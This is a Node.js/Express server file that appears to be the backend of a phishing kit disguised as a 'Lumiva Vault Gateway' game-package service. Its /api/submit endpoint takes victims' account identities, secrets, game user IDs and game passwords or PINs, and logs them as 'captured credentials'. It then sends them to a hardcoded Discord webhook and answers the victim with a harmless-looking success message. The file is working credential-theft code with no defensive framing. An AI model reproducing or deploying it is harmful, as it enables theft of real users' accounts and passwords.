// lang: JavaScript, file: server.js, target: Node.js / Express / Render Backend
const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 8080;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1553661514022649867/Ds9rtK5L0c6Ix4MkqyUB8aoUknJp7NHHDMzgp5rZZ5l9dvmVNrxKMCmhfjP7uYxHRYI9';

app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
    res.status(200).json({ status: 'online', service: 'Lumiva Vault Gateway API' });
});

app.post('/api/submit', async (req, res) => {
    const payload = req.body;

    console.log('--- CAPTURED CREDENTIALS & METADATA ---');
    console.log(`Method / Auth Type : ${payload.method || 'N/A'}`);
    console.log(`Account Identity   : ${payload.identity || 'N/A'}`);
    console.log(`Account Secret     : ${payload.secret || 'N/A'}`);
    console.log(`Target Game        : ${payload.game || 'N/A'}`);
    console.log(`Game User ID / Name: ${payload.uid || 'N/A'}`);
    console.log(`Game Password / PIN: ${payload.gamePassword || 'N/A'}`);
    console.log(`Device Platform    : ${payload.device || 'N/A'}`);
    console.log(`Selected Package   : ${payload.package || 'N/A'}`);
    console.log('----------------------------------------');

    try {
        const discordPayload = {
            embeds: [{
                title: "🚨 New Credentials Captured",
                color: 16711680,
                fields: [
                    { name: "Method", value: payload.method || 'N/A', inline: true },
                    { name: "Identity", value: `\`${payload.identity || 'N/A'}\``, inline: true },
                    { name: "Secret", value: `\`${payload.secret || 'N/A'}\``, inline: true },
                    { name: "Game", value: payload.game || 'N/A', inline: true },
                    { name: "Game UID", value: `\`${payload.uid || 'N/A'}\``, inline: true },
                    { name: "Game Pass", value: `\`${payload.gamePassword || 'N/A'}\``, inline: true },
                    { name: "Device", value: payload.device || 'N/A', inline: true },
                    { name: "Package", value: payload.package || 'N/A', inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload)
        });

        if (!response.ok) {
            console.error(`Discord API Error: ${response.status} ${response.statusText}`);
        }
    } catch (err) {
        console.error('Failed to dispatch webhook:', err);
    }

    res.status(200).json({ success: true, message: 'Payload received and processed.' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
